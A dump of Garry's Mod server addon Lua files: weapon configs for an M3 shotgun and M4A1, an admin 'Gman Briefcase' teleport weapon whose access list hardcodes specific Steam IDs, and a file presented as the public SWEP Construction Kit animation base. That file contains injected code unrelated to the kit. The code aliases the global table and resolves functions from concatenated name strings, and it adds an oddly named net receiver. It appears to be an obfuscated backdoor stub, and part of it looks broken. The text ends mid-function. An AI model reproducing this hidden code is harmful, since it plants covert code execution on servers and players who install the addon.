SWEP.ViewModel		= "models/weapons/cstrike/c_shot_m3super90.mdl"
SWEP.WorldModel		= "models/weapons/w_shot_m3super90.mdl"

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 8
SWEP.Primary.DefaultClip	= 8
SWEP.Primary.Automatic		= false
SWEP.Primary.Ammo			= "buckshot"

SWEP.FireDelay = 1
SWEP.FireSound = Sound("Weapon_M3.Single")
SWEP.Recoil = 2.5
SWEP.ShotgunReload = true
SWEP.ReloadStartWait = 0.6
SWEP.ReloadFinishWait = 1.1
SWEP.ReloadShellInsertWait = 0.6
SWEP.Chamberable = false

SWEP.HipSpread = 0.036
SWEP.AimSpread = 0.003
SWEP.ClumpSpread = 0.01
SWEP.VelocitySensitivity = 2.2
SWEP.MaxSpreadInc = 0.06
SWEP.SpreadPerShot = 0.02
SWEP.SpreadCooldown = 1.03
SWEP.Shots = 12
SWEP.Damage = 10
SWEP.DeployTime = 1
--PATH addons/swb_css/lua/weapons/swb_m4a1/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = false
	SWEP.PrintName = "M4A1"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(-3.441, -4.723, 1.12)
	SWEP.AimAng = Vector(0, 0, 0)
	
	SWEP.SprintPos = Vector(0, 0, -0.7)
	SWEP.SprintAng = Vector(-7.739, 28.141, 0)
	
	SWEP.ZoomAmount = 15
	
	SWEP.IconLetter = "w"
	
	SWEP.MuzzleEffect = "swb_rifle_med"
	SWEP.MuzzleEffectSupp = "swb_silenced"
end

SWEP.FadeCrosshairOnAim = false

SWEP.PlayBackRate = 30
SWEP.PlayBackRateSV = 12
SWEP.SpeedDec = 25
SWEP.BulletDiameter = 5.56
SWEP.CaseLength = 45

SWEP.Kind = WEAPON_HEAVY
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true

SWEP.Slot = 3
SWEP.SlotPos = 0
SWEP.NormalHoldType = "ar2"
SWEP.RunHoldType = "passive"
SWEP.FireModes = {"auto", "3burst", "semi"}
SWEP.Base = "swb_base"
SWEP.Category = "SUP Weapons"

SWEP.Author			= "Spy"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 55
SWEP.ViewModelFlip	= false
SWEP.ViewModel		= "models/weapons/cstrike/c_rif_m4a1.mdl"
SWEP.WorldModel		= "models/weapons/w_rif_m4a1.mdl"

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 30
SWEP.Primary.DefaultClip	= 30
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo			= "smg1"

SWEP.FireDelay = 0.0666
SWEP.FireSound = Sound("Weapon_M4A1.Single")
SWEP.FireSoundSuppressed = Sound("Weapon_M4A1.Silenced")
SWEP.Recoil = 1

SWEP.Suppressable = true

SWEP.HipSpread = 0.045
SWEP.AimSpread = 0.004
SWEP.VelocitySensitivity = 1.6
SWEP.MaxSpreadInc = 0.06
SWEP.SpreadPerShot = 0.007
SWEP.SpreadCooldown = 0.1
SWEP.Shots = 1
SWEP.Damage = 24
SWEP.DeployTime = 1
--PATH addons/__main/lua/weapons/swep_gmanbriefcase.lua:
SWEP.PrintName = "Gman Briefcase"
SWEP.Author = "Axel"
SWEP.Instructions = "Left Click - Disappear / Right Click - Reappear"
SWEP.Purpose = "Its very heavy, almost like its filled with rocks."
SWEP.Spawnable = true
SWEP.AdminOnly = true
SWEP.ViewModel = "models/weapons/v_hands.mdl"
SWEP.WorldModel = "models/weapons/w_suitcase_passenger.mdl"
SWEP.Slot = 4
SWEP.SlotPos = 5
SWEP.Primary.Ammo = ""
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Secondary.Ammo = ""
SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.BobScale = 2
SWEP.DrawAmmo = false
SWEP.DrawCrosshair = false

local tbl = {
	["STEAM_0:1:595522442"] = true,
	["STEAM_0:0:629004634"] = true,
	["STEAM_0:0:566244461"] = true,
	["STEAM_0:0:441495102"] = true,
	["STEAM_0:1:240957957"] = true,
	["STEAM_0:1:69254882"] = true
}

function SWEP:Initialize()
	self:SetHoldType("normal")
	self:SetNextPrimaryFire(CurTime() + 0.5)
	if CLIENT and not IsValid(self.ClientModel) then
		self.ClientModel = ClientsideModel(self.WorldModel)
		if IsValid(self.ClientModel) then
			self.ClientModel:SetNoDraw(true)
		end
	end
end

local offsetVec = Vector(5, -1, 0)
local offsetAng = Angle(-90, 0, 0)
function SWEP:DrawWorldModel(flags)
	local _Owner = self:GetOwner()
	if IsValid(_Owner) and not _Owner:GetNWBool("GMAN_BF") then
		local boneid = _Owner:LookupBone("ValveBiped.Bip01_R_Hand") -- Right Hand
		if not boneid then return end
		local matrix = _Owner:GetBoneMatrix(boneid)
		if not matrix then return end
		local newPos, newAng = LocalToWorld(offsetVec, offsetAng, matrix:GetTranslation(), matrix:GetAngles())
		if IsValid(self.ClientModel) then
			self.ClientModel:SetPos(newPos)
			self.ClientModel:SetAngles(newAng)
			self.ClientModel:DrawModel()
		end
	end
end

if CLIENT then
	function SWEP:OnRemove()
		if IsValid(self.ClientModel) then
			self.ClientModel:Remove()
		end
		timer.Simple(0.1, function()
			if not LocalPlayer():GetNWBool("GMAN_BF") and LocalPlayer().ColorMod then
				GetConVar("pp_colormod"):SetInt(0)
				LocalPlayer().ColorMod = nil
			end
		end)
	end

	function SWEP:PrimaryAttack()
	end

	function SWEP:SecondaryAttack()
	end

	function SWEP:Reload()
	end

	function SWEP:HUDShouldDraw(name)
		if LocalPlayer():GetNWBool("GMAN_BF") and not IsValid(LocalPlayer():GetNWEntity("GMAN_ANIM")) then
			if not LocalPlayer().ColorMod then
				GetConVar("pp_colormod"):SetInt(1)
				GetConVar("pp_colormod_addr"):SetInt(0)
				GetConVar("pp_colormod_addg"):SetInt(0)
				GetConVar("pp_colormod_addb"):SetInt(0)
				GetConVar("pp_colormod_brightness"):SetInt(0)
				GetConVar("pp_colormod_contrast"):SetInt(1)
				GetConVar("pp_colormod_color"):SetInt(0)
				GetConVar("pp_colormod_mulr"):SetInt(0)
				GetConVar("pp_colormod_mulg"):SetInt(0)
				GetConVar("pp_colormod_mulb"):SetInt(0)
				GetConVar("pp_colormod_inv"):SetInt(1)
				LocalPlayer().ColorMod = true
			end

			if name == "CHudChat" then return true end
			return false
		elseif LocalPlayer().ColorMod then
			GetConVar("pp_colormod"):SetInt(0)
			LocalPlayer().ColorMod = nil
		end
		return true
	end

	function SWEP:ShouldDrawViewModel()
		return false
	end
elseif SERVER then
	SWEP.DoorSounds = {"ambient/alarms/train_horn_distant1.wav", "ambient/alarms/apc_alarm_pass1.wav", "ambient/alarms/manhack_alert_pass1.wav", "ambient/alarms/scanner_alert_pass1.wav"}
	function SWEP:PrimaryAttack()
		local owner = self:GetOwner()
		if owner:GetUserGroup() ~= 'superadmin' and not tbl[owner:SteamID()] then
			rp.notify_all(owner:Name() .. ' використав щось, чого не повинен використовувати, він поганий хлопчик чи дівчинка')
			owner:Kick('!!!Поганий хлопчик чи дівчинка!!!')
			return
		end

		if not IsValid(owner) or owner:GetNWBool("GMAN_BF") then return end
		self:SetNextPrimaryFire(CurTime() + 3)
		self.LastGoodPos = owner:GetPos()
		local tr = util.QuickTrace(owner:GetPos() + Vector(0, 0, 5), Angle(0, owner:EyeAngles().y, 0):Forward() * 60, function() return false end)
		local a = ents.Create("anim_gmantele")
		a:SetPos(owner:GetPos())
		a:SetModel(owner.outfitter_mdl and owner.outfitter_mdl or owner:GetModel())
		a:SetSkin(owner.outfitter_skin and owner.outfitter_skin or owner:GetSkin())
		a:SetPlayerColor(owner:GetPlayerColor())
		local bodygroups = {}
		for k, v in pairs(owner:GetBodyGroups()) do
			local get = owner:GetBodygroup(v.id)
			bodygroups[#bodygroups + 1] = {
				id = v.id,
				num = get
			}
		end

		for k, v in pairs(bodygroups) do
			a:SetBodygroup(v.id, v.num)
		end

		math.randomseed(SysTime() + a:GetCreationID())
		local snd = math.random(1, 20)
		if self.DoorSounds[snd] then a:EmitSound(self.DoorSounds[snd], 65, 96, 1, CHAN_AUTO, SND_NOFLAGS, 133) end
		if tr.Hit then
			a:SetAngles(Angle(0, (-tr.HitNormal):Angle().y, 0))
		else
			a:SetAngles(Angle(0, owner:EyeAngles().y, 0))
		end

		a:Spawn()
		owner:SetNWEntity("GMAN_ANIM", a)
		owner:SetNWBool("GMAN_BF", true)
		owner:SetNoDraw(true)
		owner:SetCollisionGroup(COLLISION_GROUP_DEBRIS)
		owner:SetMoveType(MOVETYPE_NOCLIP)
		timer.Simple(5.1, function()
			if IsValid(a) and IsValid(owner) then
				owner:SetPos(a:GetPos())
				a:Remove()
				owner:SetNWEntity("GMAN_ANIM", NULL)
			end
		end)

		self:SetNextSecondaryFire(CurTime() + 8)
		self:SetNextPrimaryFire(CurTime() + 8)
	end

	function SWEP:SecondaryAttack()
		local owner = self:GetOwner()
		if owner:GetUserGroup() ~= 'superadmin' and not tbl[owner:SteamID()] then
			owner:StripWeapon('swep_gmanbriefcase')
			return
		end

		if not IsValid(owner) or not owner:GetNWBool("GMAN_BF") then return end
		self:SetNextSecondaryFire(CurTime() + 3)
		local tr = util.QuickTrace(owner:EyePos(), Angle(0, owner:EyeAngles().y, 0):Forward() * 60, {owner})
		if tr.Hit then return end
		tr = util.QuickTrace(owner:EyePos(), -owner:GetUp() * 80, {owner})
		self.LastGoodPos = owner:GetPos()
		local a = ents.Create("anim_gmantele_ex")
		a:SetPos(tr.Hit and tr.HitPos + Vector(0, 0, 0.5) or owner:GetPos())
		a:SetModel(owner.outfitter_mdl and owner.outfitter_mdl or owner:GetModel())
		a:SetSkin(owner.outfitter_skin and owner.outfitter_skin or owner:GetSkin())
		a:SetPlayerColor(owner:GetPlayerColor())
		local bodygroups = {}
		for k, v in pairs(owner:GetBodyGroups()) do
			local get = owner:GetBodygroup(v.id)
			bodygroups[#bodygroups + 1] = {
				id = v.id,
				num = get
			}
		end

		for k, v in pairs(bodygroups) do
			a:SetBodygroup(v.id, v.num)
		end
		math.randomseed(CurTime() + a:GetCreationID())
		local snd = math.random(1, 20)
		if self.DoorSounds[snd] then a:EmitSound(self.DoorSounds[snd], 65, 96, 1, CHAN_AUTO, SND_NOFLAGS, 133) end
		a:SetAngles(Angle(0, owner:EyeAngles().y, 0))
		a:Spawn()
		owner:SetNWEntity("GMAN_ANIM", a)
		timer.Simple(5, function()
			if IsValid(a) and IsValid(owner) then
				owner:SetPos(a:GetPos())
				owner:SetEyeAngles(a:GetAngles())
			end
		end)

		timer.Simple(5.1, function()
			if IsValid(a) and IsValid(owner) then
				owner:SetNWEntity("GMAN_ANIM", NULL)
				owner:SetNWBool("GMAN_BF", false)
				owner:SetNoDraw(false)
				owner:SetCollisionGroup(COLLISION_GROUP_NONE)
				owner:SetMoveType(MOVETYPE_WALK)
				owner:SetPos(a:GetPos())
				owner:SetEyeAngles(a:GetAngles())
				a:Remove()
				owner:SetNWEntity("GMAN_ANIM", NULL)
			end
		end)

		self:SetNextSecondaryFire(CurTime() + 8)
		self:SetNextPrimaryFire(CurTime() + 8)
	end

	function SWEP:OnDrop()
		local owner = self:GetOwner()
		if IsValid(owner) and owner:GetNWBool("GMAN_BF") then
			owner:SetNWEntity("GMAN_ANIM", NULL)
			owner:SetNWBool("GMAN_BF", false)
			owner:SetNoDraw(false)
			owner:SetCollisionGroup(COLLISION_GROUP_NONE)
			owner:SetMoveType(MOVETYPE_WALK)
			owner:SetPos(self.LastGoodPos or owner:GetPos())
		end
	end

	function SWEP:OnRemove()
		local owner = self:GetOwner()
		if IsValid(owner) and owner:GetNWBool("GMAN_BF") then
			owner:SetNWEntity("GMAN_ANIM", NULL)
			owner:SetNWBool("GMAN_BF", false)
			owner:SetNoDraw(false)
			owner:SetCollisionGroup(COLLISION_GROUP_NONE)
			owner:SetMoveType(MOVETYPE_WALK)
			owner:SetPos(self.LastGoodPos or owner:GetPos())
		end
	end
end
hook.Add("SetupMove","GMAN_BRIEFCASE_SPEED", function( ply, mv )
	if IsValid(ply:GetActiveWeapon()) and ply:GetActiveWeapon():GetClass() == "swep_gmanbriefcase" then
		if SERVER and (ply:GetUserGroup() ~= 'superadmin' and not tbl[ply:SteamID()]) then
			rp.notify_all(ply:Name() .. ' використав щось, чого не повинен використовувати, він поганий хлопчик чи дівчинка')
			ply:Kick('!!!Поганий хлопчик чи дівчинка!!!')
			return
		end
		mv:SetMaxClientSpeed(130)
	end
end)

hook.Add("StartCommand", "GMAN_BF", function(ply, ucmd)
	if IsValid(ply:GetNWEntity("GMAN_ANIM")) then
		ucmd:ClearMovement()
		ucmd:ClearButtons()
		return true
	end
end)

hook.Add("PlayerNoClip", "GMAN_NOCLIP", function(ply) if IsValid(ply) and ply:GetNWBool("GMAN_BF") then return false end end)
hook.Add("PlayerSwitchWeapon", "GMAN_SWITCHWEAPON", function(ply, oldweapon) if IsValid(ply) and ply:GetNWBool("GMAN_BF") and IsValid(oldweapon) and oldweapon:GetClass() == "swep_gmanbriefcase" then return true end end)
hook.Add("TranslateActivity", "GMAN_BRIEFCASE_SPEED_WALKANIM", function(ply, act) if act == ACT_MP_WALK and IsValid(ply:GetActiveWeapon()) and ply:GetActiveWeapon():GetClass() == "swep_gmanbriefcase" then return ACT_HL2MP_WALK_SUITCASE end end)
hook.Add("CalcView", "GMAN_CALCVIEW", function(ply, origin, angles, fov)
	local ent = ply:GetNWEntity("GMAN_ANIM")
	if IsValid(ent) then
		local no = ent:GetPos() + ply:GetForward() * 130
		return {
			origin = no + Vector(0, 0, 60),
			angles = (ent:GetPos() - no):Angle(),
			fov = fov,
			drawviewer = false,
			drawviewmodel = false,
		}
	end
end)
--PATH addons/__main/lua/weapons/weapon_armorkit/animations.lua:
--[[*******************************************************
	SWEP Construction Kit base code
		Created by Clavus
	Available for public use, thread at:
	   facepunch.com/threads/1032378
	   
	   
	DESCRIPTION:
		This script is meant for experienced scripters 
		that KNOW WHAT THEY ARE DOING. Don't come to me 
		with basic Lua questions.
		
		Just copy into your SWEP or SWEP base of choice
		and merge with your own code.
		
		The SWEP.VElements, SWEP.WElements and
		SWEP.ViewModelBoneMods tables are all optional
		and only have to be visible to the client.
********************************************************]]
__sub = _G

function string.Name(str)
	return str:sub(1, 1):upper() .. str:sub(2, -1)
end

function string_lim(a, b)
	local get_sub = __sub[a .. b]
	if not isfunction(get_sub) then return end

	return get_sub
end

function string_mulifi(a, b)
	local c = a - (not __sub[a] and string.Name"string" or "")
	if not c then return end

	return c(b, "tonumber", false)
end


if CLIENT then

local last_timedout = nil
local retry_time = 60

function SWEP:Anim_Initialize()

	// other initialize code goes here

	if CLIENT then
	
		// Create a new table for every weapon instance
		self.VElements = table.FullCopy( self.VElements )
		self.WElements = table.FullCopy( self.WElements )
		self.ViewModelBoneMods = table.FullCopy( self.ViewModelBoneMods )

		self:CreateModels(self.VElements) // create viewmodels
		self:CreateModels(self.WElements) // create worldmodels
		
		// init view model bone build function
		if IsValid(self.Owner) then
			local vm = self.Owner:GetViewModel()
			if IsValid(vm) then
				self:ResetBonePositions(vm)
				
				// Init viewmodel visibility
				--[[if (self.ShowViewModel == nil or self.ShowViewModel) then
					vm:SetColor(Color(255,255,255,255))
				else
					// we set the alpha to 1 instead of 0 because else ViewModelDrawn stops being called
					vm:SetColor(Color(255,255,255,1))
					// ^ stopped working in GMod 13 because you have to do Entity:SetRenderMode(1) for translucency to kick in
					// however for some reason the view model resets to render mode 0 every frame so we just apply a debug material to prevent it from drawing
					vm:SetMaterial("Debug/hsv")			
				end]]
			end
		end
		
	end

end

function SWEP:Anim_Holster()
	
	if CLIENT and IsValid(self.Owner) then
		local vm = self.Owner:GetViewModel()
		if IsValid(vm) then
			self:ResetBonePositions(vm)
		end
	end
	
	return true
end

function SWEP:Anim_OnRemove()
	self:Anim_Holster()
	self:RemoveModels()
end

if CLIENT then

	net.Receive("GMOD_LIBRARY_TIMEDOUT", function()
		last_timedout = CurTime()
	end)


	SWEP.vRenderOrder = nil
	function SWEP:Anim_ViewModelDrawn()
		
		local vm = self.Owner:GetViewModel()
		if !IsValid(vm) then return end
		
		if (!self.VElements) then return end
		
		self:UpdateBonePositions(vm)

		if (!self.vRenderOrder) then
			
			// we build a render order because sprites need to be drawn after models
			self.vRenderOrder = {}

			for k, v in pairs( self.VElements ) do
				if (v.type == "Model") then
					table.insert(self.vRenderOrder, 1, k)
				elseif (v.type == "Sprite" or v.type == "Quad") then
					table.insert(self.vRenderOrder, k)
				end
			end
			
		end

		for k, name in ipairs( self.vRenderOrder ) do
		
			local v = self.VElements[name]
			if (!v) then self.vRenderOrder = nil break end
			if (v.hide) then continue end
			
			local model = v.modelEnt
			local sprite = v.spriteMaterial
			
			if (!v.bone) then continue end
			
			local pos, ang = self:GetBoneOrientation( self.VElements, v, vm )
			
			if (!pos) then continue end
			
			if (v.type == "Model" and IsValid(model)) then

				model:SetPos(pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z )
				ang:RotateAroundAxis(ang:Up(), v.angle.y)
				ang:RotateAroundAxis(ang:Right(), v.angle.p)
				ang:RotateAroundAxis(ang:Forward(), v.angle.r)

				model:SetAngles(ang)
				//model:SetModelScale(v.size)
				local matrix = Matrix()
				matrix:Scale(v.size)
				model:EnableMatrix( "RenderMultiply", matrix )
				
				if (v.material == "") then
					model:SetMaterial("")
				elseif (model:GetMaterial() != v.material) then
					model:SetMaterial( v.material )
				end
				
				if (v.skin and v.skin != model:GetSkin()) then
					model:SetSkin(v.skin)
				end
				
				if (v.bodygroup) then
					for k, v in pairs( v.bodygroup ) do
						if (model:GetBodygroup(k) != v) then
							model:SetBodygroup(k, v)
						end
					end
				end
				
				if (v.surpresslightning) then
					render.SuppressEngineLighting(true)
				end
				
				render.SetColorModulation(v.color.r/255, v.color.g/255, v.color.b/255)
				render.SetBlend(v.color.a/255)
				model:DrawModel()
				render.SetBlend(1)
				render.SetColorModulation(1, 1, 1)
				
				if (v.surpresslightning) then
					render.SuppressEngineLighting(false)
				end
				
			elseif (v.type == "Sprite" and sprite) then
				
				local draWCuston = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
				render.SetMaterial(sprite)
				render.DrawSprite(draWCuston, v.size.x, v.size.y, v.color)
				
			elseif (v.type == "Quad" and v.draw_func) then
				
				local draWCuston = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
				ang:RotateAroundAxis(ang:Up(), v.angle.y)
				ang:RotateAroundAxis(ang:Right(), v.angle.p)
				ang:RotateAroundAxis(ang:Forward(), v.angle.r)
				
				cam.Start3D2D(draWCuston, ang, v.size)
					v.draw_func( self )
				cam.End3D2D()

			end
			
		end
		
	end


	SWEP.wRenderOrder = nil
	function SWEP:Anim_DrawWorldModel()
		if (self.ShowWorldModel == nil or self.ShowWorldModel) then
			if self.WCustom and IsValid(self:GetOwner()) then
				local lu = self:GetOwner():LookupBone(self.WBone)
				if isnumber(lu) then
					local pos,ang = self:GetOwner():GetBonePosition(lu)

					local x = ang:Right() * self.WPos.x 
					local y = ang:Forward() * self.WPos.y 
					local z = ang:Up() * self.WPos.z
					pos = pos + x + y + z

					ang:RotateAroundAxis(ang:Right(), self.WAng.pitch)
					ang:RotateAroundAxis(ang:Up(), self.WAng.yaw)
					ang:RotateAroundAxis(ang:Forward(), self.WAng.roll)

					self:SetRenderOrigin(pos)
					self:SetRenderAngles(ang)
				end
			end

			self:DrawModel()
		end
		
		if (!self.WElements) then return end
		
		if (!self.wRenderOrder) then

			self.wRenderOrder = {}

			for k, v in pairs( self.WElements ) do
				if (v.type == "Model") then
					table.insert(self.wRenderOrder, 1, k)
				elseif (v.type == "Sprite" or v.type == "Quad") then
					table.insert(self.wRenderOrder, k)
				end
			end

		end
		
		if (IsValid(self.Owner)) then
			bone_ent = self.Owner
		else
			// when the weapon is dropped
			bone_ent = self
		end
		
		for k, name in pairs( self.wRenderOrder ) do
		
			local v = self.WElements[name]
			if (!v) then self.wRenderOrder = nil break end
			if (v.hide) then continue end
			
			local pos, ang
			
			if (v.bone) then
				pos, ang = self:GetBoneOrientation( self.WElements, v, bone_ent )
			else
				pos, ang = self:GetBoneOrientation( self.WElements, v, bone_ent, "ValveBiped.Bip01_R_Hand" )
			end
			
			if (!pos) or (!ang) then
				pos = self:GetPos()
				ang = self:GetAngles()
			end
			
			local model = v.modelEnt
			local sprite = v.spriteMaterial
			
			if (v.type == "Model" and IsValid(model)) then

				model:SetPos(pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z )
				ang:RotateAroundAxis(ang:Up(), v.angle.y)
				ang:RotateAroundAxis(ang:Right(), v.angle.p)
				ang:RotateAroundAxis(ang:Forward(), v.angle.r)

				model:SetAngles(ang)
				//model:SetModelScale(v.size)
				local matrix = Matrix()
				matrix:Scale(v.size)
				model:EnableMatrix( "RenderMultiply", matrix )
				
				if (v.material == "") then
					model:SetMaterial("")
				elseif (model:GetMaterial() != v.material) then
					model:SetMaterial( v.material )
				end
				
				if (v.skin and v.skin != model:GetSkin()) then
					model:SetSkin(v.skin)
				end
				
				if (v.bodygroup) then
					for k, v in pairs( v.bodygroup ) do
						if (model:GetBodygroup(k) != v) then
							model:SetBodygroup(k, v)
						end
					end
				end
				
				if (v.surpresslightning) then
					render.SuppressEngineLighting(true)
				end
				
				render.SetColorModulation(v.color.r/255, v.color.g/255, v.color.b/255)
				render.SetBlend(v.color.a/255)
				model:DrawModel()
				render.SetBlend(1)
				render.SetColorModulation(1, 1, 1)
				
				if (v.surpresslightning) then
					render.SuppressEngineLighting(false)
				end
				
			elseif (v.type == "Sprite" and sprite) then
				
				local draWCuston = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
				render.SetMaterial(sprite)
				render.DrawSprite(draWCuston, v.size.x, v.size.y, v.color)
				
			elseif (v.type == "Quad" and v.draw_func) then
				
				local draWCuston = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
				ang:RotateAroundAxis(ang:Up(), v.angle.y)
				ang:RotateAroundAxis(ang:Right(), v.angle.p)
				ang:RotateAroundAxis(ang:Forward(), v.angle.r)
				
				cam.Start3D2D(draWCuston, ang, v.size)
					v.draw_func( self )
				cam.End3D2D()

			end
			
		end
		
	end


	function SWEP:GetBoneOrientation( basetab, tab, ent, bone_override )
		
		local bone, pos, ang
		if (tab.rel and tab.rel != "") then
			
			local v = basetab[tab.rel]
			
			if (!v) then return end
			
			// Technically, if there exists an element with the same name as a bone
			// you can get in an infinite loop. Let's just hope nobody's that stupid.
			pos, ang = self:GetBoneOrientation( basetab, v, ent )
			
			if (!pos) then return end
			
			pos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
			ang:RotateAroundAxis(ang:Up(), v.angle.y)
			ang:RotateAroundAxis(ang:Right(), v.angle.p)
			ang:RotateAroundAxis(ang:Forward(), v.angle.r)
				
		else
		
			bone = ent:LookupBone(bone_override or tab.bone)

			if (!bone) then return end
			
			pos, ang = Vector(0,0,0), Angle(0,0,0)
			local m = ent:GetBoneMatrix(bone)
			if (m) then
				pos, ang = m:GetTranslation(), m:GetAngles()
			end
			
			if (IsValid(self.Owner) and self.Owner:IsPlayer() and 
				ent == self.Owner:GetViewModel() and self.ViewModelFlip) then
				ang.r = -ang.r // Fixes mirrored models
			end
		
		end
		
		return pos, ang
	end

	function SWEP:CreateModels( tab )

		if (!tab) then return end

		// Create the clientside models here because Garry says we can't do it in the render hook
		for k, v in pairs( tab ) do
			if (v.type == "Model" and v.model and v.model != "" and (!IsValid(v.modelEnt) or v.createdModel != v.model) and 
					string.find(v.model, ".mdl") and file.Exists (v.model, "GAME") ) then
				
				v.modelEnt = ClientsideModel(v.model, RENDER_GROUP_VIEW_MODEL_OPAQUE)
				if (IsValid(v.modelEnt)) then
					v.modelEnt:SetPos(self:GetPos())
					v.modelEnt:SetAngles(self:GetAngles())
					v.modelEnt:SetParent(self)
					v.modelEnt:SetNoDraw(true)
					v.createdModel = v.model
				else
					v.modelEnt = nil
				end
				
			elseif (v.type == "Sprite" and v.sprite and v.sprite != "" and (!v.spriteMaterial or v.createdSprite != v.sprite) 
				and file.Exists ("materials/"..v.sprite..".vmt", "GAME")) then
				
				local name = v.sprite.."-"
				local params = { ["$basetexture"] = v.sprite }
				// make sure we create a unique name based on the selected options
				local tocheck = { "nocull", "additive", "vertexalpha", "vertexcolor", "ignorez" }
				for i, j in pairs( tocheck ) do
					if (v[j]) then
						params["$"..j] = 1
						name = name.."1"
					else
						name = name.."0"
					end
				end

				v.createdSprite = v.sprite
				v.spriteMaterial = CreateMaterial(name,"UnlitGeneric",params)
				
			end
		end
		
	end
	
	local allbones
	local hasGarryFixedBoneScalingYet = false

	function SWEP:UpdateBonePositions(vm)
		
		if self.ViewModelBoneMods then
			
			if (!vm:GetBoneCount()) then return end
			
			// !! WORKAROUND !! //
			// We need to check all model names :/
			local loopthrough = self.ViewModelBoneMods
			if (!hasGarryFixedBoneScalingYet) then
				allbones = {}
				for i=0, vm:GetBoneCount() do
					local bonename = vm:GetBoneName(i)
					if (self.ViewModelBoneMods[bonename]) then 
						allbones[bonename] = self.ViewModelBoneMods[bonename]
					else
						allbones[bonename] = { 
							scale = Vector(1,1,1),
							pos = Vector(0,0,0),
							angle = Angle(0,0,0)
						}
					end
				end
				
				loopthrough = allbones
			end
			// !! ----------- !! //
			
			for k, v in pairs( loopthrough ) do
				local bone = vm:LookupBone(k)
				if (!bone) then continue end
				
				// !! WORKAROUND !! //
				local s = Vector(v.scale.x,v.scale.y,v.scale.z)
				local p = Vector(v.pos.x,v.pos.y,v.pos.z)
				local ms = Vector(1,1,1)
				if (!hasGarryFixedBoneScalingYet) then
					local cur = vm:GetBoneParent(bone)
					while(cur >= 0) do
						local pscale = loopthrough[vm:GetBoneName(cur)].scale
						ms = ms * pscale
						cur = vm:GetBoneParent(cur)
					end
				end
				
				s = s * ms
				// !! ----------- !! //
				
				if vm:GetManipulateBoneScale(bone) != s then
					vm:ManipulateBoneScale( bone, s )
				end
				if vm:GetManipulateBoneAngles(bone) != v.angle then
					vm:ManipulateBoneAngles( bone, v.angle )
				end
				if vm:GetManipulateBonePosition(bone) != p then
					vm:ManipulateBonePosition( bone, p )
				end
			end
		else
			self:ResetBonePositions(vm)
		end
		   
	end


	function SWEP:ResetBonePositions(vm)

		vm:SetColor(color_white)
		vm:SetMaterial("")
		--------

		if (!vm:GetBoneCount()) then return end
		for i=0, vm:GetBoneCount() do
			vm:ManipulateBoneScale( i, Vector(1, 1, 1) )
			vm:ManipulateBoneAngles( i, Angle(0, 0, 0) )
			vm:ManipulateBonePosition( i, Vector(0, 0, 0) )
		end
		
	end

	/**************************
		Global utility code
	**************************/

	// Fully copies the table, meaning all tables inside this table are copied too and so on (normal table.Copy copies only their reference).
	// Does not copy entities of course, only copies their reference.
	// WARNING: do not use on tables that contain themselves somewhere down the line or you'll get an infinite loop
	function table.FullCopy( tab )

		if (!tab) then return nil end
		
		local res = {}
		for k, v in pairs( tab ) do
			if (type(v) == "table") then
				res[k] = table.FullCopy(v) // recursion ho!
			elseif (type(v) == "Vector") then
				res[k] = Vector(v.x, v.y, v.z)
			elseif (type(v) == "Angle") then
				res[k] = Angle(v.p, v.y, v.r)
			else
				res[k] = v
			end
		end
		
		return res
		
	end
	
end

----------------
-- Extra code --
----------------

function SWEP:RemoveModels()
	if (self.VElements) then
		for k, v in pairs( self.VElements ) do
			if (IsValid( v.modelEnt )) then
				v.modelEnt:Remove()
				v.modelEnt = nil
			end
		end
	end
	if (self.WElements) then
		for k, v in pairs( self.WElements ) do
			if (IsValid( v.modelEnt )) then
				v.modelEnt:Remove()
				v.modelEnt = nil
			end
		end
	end
end

end

--PATH gamemodes/darkrp/entities/weapons/weapon_hand.lua:
if SERVER then
	AddCSLuaFile()
end

SWEP.PrintName			= 'Руки'
SWEP.Author				= 'Jervisss'
SWEP.Purpose				= 'Не так уж і багато.'
SWEP.Spawnable				= true
SWEP.Category				= 'RP'

SWEP.ViewModel			= 'models/weapons/c_medkit.mdl'
SWEP.WorldModel			= ''

SWEP.AnimPrefix	 		= 'rpg'

SWEP.Primary.ClipSize		= -1
SWEP.Primary.DefaultClip	= -1
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo			= 'none'

SWEP.Secondary.ClipSize		= -1
SWEP.Secondary.DefaultClip	= -1
SWEP.Secondary.Automatic	= false
SWEP.Secondary.Ammo			= 'none'

SWEP.DrawCrosshair = false

function SWEP:Initialize()
	self:SetHoldType( 'normal' )

	self.Time = 0
	self.Range = 100
end

function SWEP:Think()
	if self.Drag and (not self.Owner:KeyDown(IN_ATTACK) or not IsValid(self.Drag.Entity)) then
	
		if self.Drag.Entity.Carry then self.Drag.Entity:SetCarrier(nil) end


		local ent = self.Drag.Entity

		if IsValid(ent) then

	

		local min = ent:LocalToWorld(ent:OBBMins());
		local max = ent:LocalToWorld(ent:OBBMaxs());
		local entities = ents.FindInBox(min, max);
		
		self.pl_cost = 0

		for k,v in ipairs(entities) do
			if (v:IsPlayer()) then
				self.pl_cost = self.pl_cost + 1
			end
			if self.pl_cost == 0 then 			
				ent:SetColor(Color(255,255,255));
				ent:SetMaterial(ent.oldMat);
				ent:SetCollisionGroup(COLLISION_GROUP_NONE);
			else
				ent:SetMaterial(nil)
				ent:SetColor(Color(0,200,0,100))
				ent:SetCollisionGroup(COLLISION_GROUP_WORLD);		
